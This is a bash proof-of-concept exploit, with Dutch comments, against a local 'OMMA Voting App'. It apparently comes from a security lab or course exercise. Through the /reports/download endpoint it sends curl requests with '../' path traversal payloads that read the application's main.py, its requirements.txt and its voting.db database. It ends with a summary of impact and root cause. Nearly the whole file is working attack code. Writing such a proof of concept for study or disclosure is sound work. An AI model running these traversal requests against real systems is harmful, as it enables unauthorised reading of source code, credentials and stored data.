#!/bin/bash
# Path Traversal Exploit - OMMA Voting App
# Target: /reports/download endpoint

BASE_URL="http://127.0.0.1:8080"

echo "=================================================="
echo "PATH TRAVERSAL EXPLOIT - OMMA Voting App"
echo "Target: ${BASE_URL}/reports/download"
echo "=================================================="
echo ""

echo "[STAP 1] Legitieme download..."
echo "Command: curl \"${BASE_URL}/reports/download?file=voting_report_2026.txt\""
echo ""
curl -s "${BASE_URL}/reports/download?file=voting_report_2026.txt"
echo ""
echo "---"
echo ""

echo "[STAP 2] Path Traversal - Broncode lezen"
echo "Command: curl \"${BASE_URL}/reports/download?file=../app/main.py\""
echo "Payload: ../app/main.py"
echo ""
echo "Output (eerste 50 regels):"
curl -s "${BASE_URL}/reports/download?file=../app/main.py" | head -50
echo ""
echo "... (meer regels)"
echo "---"
echo ""

echo "[STAP 3] Path Traversal - Requirements lezen"
echo "Command: curl \"${BASE_URL}/reports/download?file=../requirements.txt\""
echo "Payload: ../requirements.txt"
echo ""
curl -s "${BASE_URL}/reports/download?file=../requirements.txt"
echo ""
echo "---"
echo ""

echo "[STAP 4] Path Traversal - Database lezen (binary)"
echo "Command: curl \"${BASE_URL}/reports/download?file=../voting.db\""
echo "Payload: ../voting.db"
echo ""
echo "Database bestand geëxtraheerd (binary data, eerste bytes):"
curl -s "${BASE_URL}/reports/download?file=../voting.db" | head -c 200
echo ""
echo "... (binary data)"
echo "---"
echo ""

echo "=================================================="
echo "EXPLOIT SUCCESVOL!"
echo ""
echo "IMPACT:"
echo "  - Broncode van applicatie gelezen"
echo "  - Dependencies bestand gelezen"
echo "  - Database bestand geëxtraheerd"
echo "  - Alle files buiten reports/ directory toegankelijk"
echo ""
echo "ROOT CAUSE:"
echo "  - Directe string concatenation zonder sanitization"
echo "  - Geen path validation"
echo "  - Geen check of path binnen reports/ blijft"
echo "=================================================="

